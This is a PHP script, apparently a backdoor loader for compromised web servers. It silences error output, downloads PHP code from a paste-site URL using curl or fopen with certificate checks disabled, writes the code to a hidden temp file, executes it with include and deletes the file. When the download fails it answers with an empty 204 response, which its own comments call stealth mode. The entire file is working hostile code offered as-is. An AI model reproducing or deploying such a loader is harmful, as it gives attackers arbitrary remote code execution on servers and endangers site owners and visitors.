<?php
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
error_reporting(0);

$u = 'https://paste.myconan.net/592197.txt';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0';
$c = '';

// Coba curl kalau tersedia
if (function_exists('curl_init')) {
    $h = curl_init();
    curl_setopt_array($h, [
        CURLOPT_URL => $u,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => $ua
    ]);
    $c = curl_exec($h);
    curl_close($h);
}

// Fallback ke fopen jika curl tidak tersedia
if (!$c && function_exists('fopen')) {
    $opts = [
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: $ua\r\nAccept: */*\r\n"
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    $ctx = stream_context_create($opts);
    $f = @fopen($u, 'r', false, $ctx);
    if ($f) {
        while (!feof($f)) $c .= fread($f, 2048);
        fclose($f);
    }
}

// Evaluasi hanya jika konten aman & valid
if ($c && strlen($c) > 50 && stripos($c, '<?php') !== false) {
    $tmp = sys_get_temp_dir() . '/.' . md5($u . microtime()) . '.php';
    if (@file_put_contents($tmp, $c)) {
        include $tmp;
        @unlink($tmp);
        exit;
    }
}

// Stealth mode kalau gagal
header("HTTP/1.1 204 No Content");
exit;
?>
